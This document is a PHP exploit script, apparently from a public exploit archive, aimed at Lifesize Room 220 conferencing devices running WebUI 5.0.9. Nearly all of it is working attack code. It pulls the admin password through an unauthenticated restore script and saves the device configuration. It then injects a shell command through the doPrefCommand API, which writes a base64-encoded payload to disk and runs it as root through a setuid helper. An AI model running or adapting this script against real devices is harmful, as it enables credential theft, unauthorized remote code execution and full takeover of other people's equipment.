#!/usr/bin/env php
<?php
/*
# Exploit Title: Lifesize WebUI - RCE + LPE = YAY
# Date: 01-07-2016
# Vendor Homepage: http://www.lifesize.com/
# Version: 5.0.9
# Tested on: LifeSize Room 220
# CVE : N/A

This exploit uses the 'LsSystemRestore.sh' script to disclose the 
current configuration, that is then leveraged to gain access to 
exploitable APIs in the admin portal which allow arbitrary command
injection, then uses a local privilege escalation bug to execute 
the payload as root.

This will work as long as port 443 is open on the phone, Lifesize
support recommend that the power and ethernet cables are disconnected 
from the device to ensure it remains secure.

LsSystemRestore.sh allows 'autosh' commands to be executed 
without any authentication, this is used to grab the Admin 
password via the 'get config -P' command.

Using the Admin password AMF commands can be sent to the 
LSRoom_Remoting endpoint, this contains a method called
'doPrefCommand' which is vulnerable to command injection.

Local privilege escalation to root is gained by executing 
the setuid 'tcpdump_manager' executable, which runs a program
called 'reset_tcpdump' from the current directory...
*/

require_once 'sabreamf.min.php';


function multipart_build_query($fields, $boundary){
  $retval = '';
  foreach($fields as $key => $value){
    $retval .= "--$boundary\nContent-Disposition: form-data; name=\"$key\"\n\n$value\n";
  }
  return $retval;
}


function run_autosh($ip, $config){
	$boundary = 'myboundary-xxx';
	$postfields = multipart_build_query(array('config' => $config), $boundary);

	$url = sprintf('https://%s/cgi-bin/LsSystemRestore.sh', $ip);
	$curl = curl_init();
	curl_setopt($curl, CURLOPT_URL, $url);
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($curl, CURLOPT_HEADER, false);
	curl_setopt($curl, CURLOPT_HTTPHEADER, array(
		"Content-Type: multipart/form-data; boundary=--$boundary"
	));
	curl_setopt($curl, CURLOPT_SSL_CIPHER_LIST, "ALL");
	curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
	curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($curl, CURLOPT_POSTFIELDS, $postfields);
	curl_setopt($curl, CURLOPT_POST, TRUE);
	$data = curl_exec($curl);
	curl_close($curl);
	return $data;
}


if( count($argv) < 3 ) {
	printf("Usage: %s <ip> <payload-file>\n", basename($argv[0]));
	exit;
}


$ip = $argv[1];
$payload = $argv[2];
if( ! file_exists($payload) ) {
	echo "[!] Payload doesn't exist\n";
	exit;
}
$payload_b64 = wordwrap(base64_encode(file_get_contents($payload)), 69, "\n", TRUE);

echo "[*] Retrieving admin password\n";
$config = run_autosh($ip, "get config -P");
if( empty($config) ) {
	echo "[!] Failed\n";
	exit;
} 

echo "[*] Saving config for $ip\n";
file_put_contents($ip . '.config', $config);

preg_match('@set admin password "([^"]+)"@', $config, $M);
if( ! isset($M[1]) ) {
	echo "[!] Failed\n";
	exit;
}
$admin_password = $M[1];
echo "[*] Admin password is: $admin_password\n";

$pass = md5($admin_password.'LIFESIZE');
$client = new SabreAMF_Client("https://$ip/gateway.php");

echo "[*] Authenticating for AMF RPC\n";
$token = $client->sendRequest('LSRoom_Remoting.authenticate', new SabreAMF_AMF3_Wrapper(array($pass)));
if( $token == md5('false'.'L1F351z3') ) {
	echo "[!] Login Failed!\n";
	exit;
}

// Payload is encoded with base64 so it can be transported
// safely through the "scrubPrefString" function...
$cmd = sprintf('(cd /tmp && echo "%s" | openssl enc -base64 -d >reset_tcpdump && chmod 755 reset_tcpdump && PATH=.:$PATH tcpdump_manager) && echo SUCCESSFUL ', $payload_b64);

$client = new SabreAMF_Client("https://$ip/gateway.php");
echo "[*] Sending command: $cmd\n";
$result = $client->sendRequest('LSRoom_Remoting.doPrefCommand', new SabreAMF_AMF3_Wrapper(array($cmd . '|| pref -h', '213')));
if( ! isset($result[3]) ) {
	echo "[!] Command execution failed\n";
	exit;
}
echo $result[3] . "\n";
unlink('cookie.txt');